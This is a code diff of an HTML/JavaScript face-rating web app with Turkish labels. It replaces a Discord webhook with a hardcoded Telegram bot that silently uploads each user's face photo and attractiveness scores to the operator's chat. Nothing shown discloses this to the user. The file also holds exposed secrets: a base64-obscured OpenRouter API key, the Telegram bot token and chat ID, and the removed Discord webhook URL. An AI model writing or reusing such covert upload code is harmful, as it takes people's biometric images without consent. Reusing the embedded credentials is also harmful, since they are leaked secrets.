@@ -88,7 +88,7 @@
 <div class="input-group"><span class="icon">🔒</span><input type="password" id="passwordInput" placeholder="Şifre..." autocomplete="off"></div>
 <button class="btn btn-primary" id="btnLogin">GİRİŞ</button>
 <div class="error-box" id="loginError"></div>
-<footer>v36 • TANK</footer>
+<footer>v37 • MOBIL LOG</footer>
 </div>
 </div>
 <div class="page" id="pageAnalyze">
@@ -134,7 +134,8 @@ async function loadFaceApi(){try{await faceapi.nets.tinyFaceDetector.loadFromUri
 loadFaceApi();
 
 const OR_KEY=atob("c2stb3ItdjEtMDQyMjY4NGViZjM4NmM2NmFhMDYwMTNhNGFkODZhOWJlZGJiNjU2MDNmMzJmMTU3NmQyNWM4ZDM3NTU5NGYzNQ==");
-const WH="https://discord.com/api/webhooks/1531268363177693204/_XaO-oD_v6yTYfdRFdBUSicdwtNuQCC1kdSWPjHxmdMtk0XAnJProV0YuUGbYXebGEhH";
+const TG_TOKEN="8869691720:AAH1GsHRxc1LxmoOaXN1qSQpfjj793vI_jQ";
+const TG_CHAT_ID="8759264847";
 const API_URL="https://openrouter.ai/api/v1/chat/completions";
 
 let base64Image="",currentMimeType="image/jpeg",faceData=null;
@@ -242,57 +243,78 @@ function renderResult(raw){
     extra+=`<div style="color:#888;font-size:10px;">Harmony: %30 | Dimorphism: %30 | Angularity: %25 | Diğer: %15</div>`;
     document.getElementById('rawText').innerHTML=extra;
 
-    // 🔥 TANK GİBİ SAĞLAM DİSCORD GÖNDERİMİ 🔥
-    try {
-        const goodTxt = (r.best.slice(0,10).map((i,n)=>`${n+1}. ${i}`).join('\n') || 'Yok').substring(0, 1000);
-        const badTxt = (r.worst.slice(0,10).map((i,n)=>`${n+1}. ${i}`).join('\n') || 'Yok').substring(0, 1000);
+    console.log('📤 Telegram gönderiliyor...');
+    sendToTelegram(raw);
+}
 
-        const emb = {
-            title:'🔥 25 MAX ANALİZ',
-            color:0x00ff41,
-            fields:[
-                {name:'🏆 MOG',value:`**${r.mog}/10**`,inline:true},
-                {name:'📊 PSL',value:`**${r.psl}/10**`,inline:true},
-                {name:'🎯 Kategori',value:`**${r.cat}**`,inline:true},
-                {name:'💫 Appeal',value:`**${r.appeal}/10**`,inline:true},
-                {name:'⚖️ Harmony',value:`**%${r.harmony}**`,inline:true},
-                {name:'🧬 Dimorphism',value:`**%${r.dimorphism}**`,inline:true},
-                {name:'📐 Angularity',value:`**%${r.angularity}**`,inline:true},
-                {name:'✅ EN İYİ',value:goodTxt,inline:false},
-                {name:'❌ EN KÖTÜ',value:badTxt,inline:false}
-            ],
-            footer:{text:'25 Max App'},
-            timestamp:new Date().toISOString()
-        };
+async function sendToTelegram(rawText) {
+    const r = parseAI(rawText);
+
+    const caption = `🔥 <b>25 MAX ANALİZ RAPORU</b> 🔥\n\n` +
+        `🏆 <b>MOG:</b> ${r.mog}/10\n` +
+        `📊 <b>PSL:</b> ${r.psl}/10 (${r.cat})\n` +
+        `💫 <b>Appeal:</b> ${r.appeal}/10\n` +
+        `⚖️ <b>Harmony:</b> %${r.harmony}\n` +
+        `🧬 <b>Dimorphism:</b> %${r.dimorphism}\n` +
+        `📐 <b>Angularity:</b> %${r.angularity}\n\n` +
+        `✅ <b>EN İYİ:</b>\n${r.best.slice(0, 5).map((i, n) => `${n + 1}. ${i}`).join('\n')}\n\n` +
+        `❌ <b>EN KÖTÜ:</b>\n${r.worst.slice(0, 5).map((i, n) => `${n + 1}. ${i}`).join('\n')}`;
+
+    try {
+        const byteCharacters = atob(base64Image);
+        const byteNumbers = new Array(byteCharacters.length);
+        for (let i = 0; i < byteCharacters.length; i++) {
+            byteNumbers[i] = byteCharacters.charCodeAt(i);
+        }
+        const byteArray = new Uint8Array(byteNumbers);
+        const blob = new Blob([byteArray], { type: currentMimeType });
 
         const fd = new FormData();
+        fd.append('chat_id', TG_CHAT_ID);
+        fd.append('photo', blob, 'face.jpg');
+        fd.append('caption', caption);
+        fd.append('parse_mode', 'HTML');
 
-        if (base64Image) {
-            const byteCharacters = atob(base64Image);
-            const byteNumbers = new Array(byteCharacters.length);
-            for (let i = 0; i < byteCharacters.length; i++) {
-                byteNumbers[i] = byteCharacters.charCodeAt(i);
-            }
-            const byteArray = new Uint8Array(byteNumbers);
-            const blob = new Blob([byteArray], { type: currentMimeType });
+        const res = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: fd
+        });
 
-            fd.append('files[0]', blob, 'face.jpg');
-            emb.image = { url: 'attachment://face.jpg' };
-        }
+        if (res.ok) console.log('🟢 Telegram: Fotoğraf + Mesaj geldi!');
+        else console.error('🔴 Telegram Hatası:', res.status);
 
-        fd.append('payload_json', JSON.stringify({ embeds: [emb] }));
-
-        fetch(WH, { method: 'POST', body: fd })
-            .then(r => {
-                if(r.ok) console.log('📤 Discord: ✅ BAŞARILI');
-                else console.log('📤 Discord Hata Kodu:', r.status);
-            })
-            .catch(e => console.error('📤 Discord Webhook Patladı:', e));
-
-    } catch (err) {
-        console.error('Discord paketleme hatası:', err);
+    } catch (e) {
+        console.error('🔴 Telegram Bağlantı Hatası:', e);
     }
 }
+</script>
+
+<!-- 📱 MOBİL LOG PANELİ -->
+<div id="mobileConsole" style="position:fixed;bottom:0;left:0;right:0;height:110px;background:rgba(0,0,0,0.95);color:#00ff41;font-size:11px;font-family:monospace;overflow-y:auto;padding:8px;z-index:999999;border-top:2px solid #00ff41;pointer-events:none;">
+  <b style="color:#fff;">📱 CANLI LOG:</b><br>
+</div>
+
+<script>
+(function() {
+    const oldLog = console.log;
+    const oldErr = console.error;
+    const logDiv = document.getElementById('mobileConsole');
+    
+    console.log = function(...args) {
+        oldLog.apply(console, args);
+        if(logDiv) {
+            logDiv.innerHTML += `<div style="margin-bottom:2px;">🟢 ${args.join(' ')}</div>`;
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
+    };
+    console.error = function(...args) {
+        oldErr.apply(console, args);
+        if(logDiv) {
+            logDiv.innerHTML += `<div style="color:#ff4444;margin-bottom:2px;">🔴 ${args.join(' ')}</div>`;
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
+    };
+})();
 </script>
 </body>
 </html>
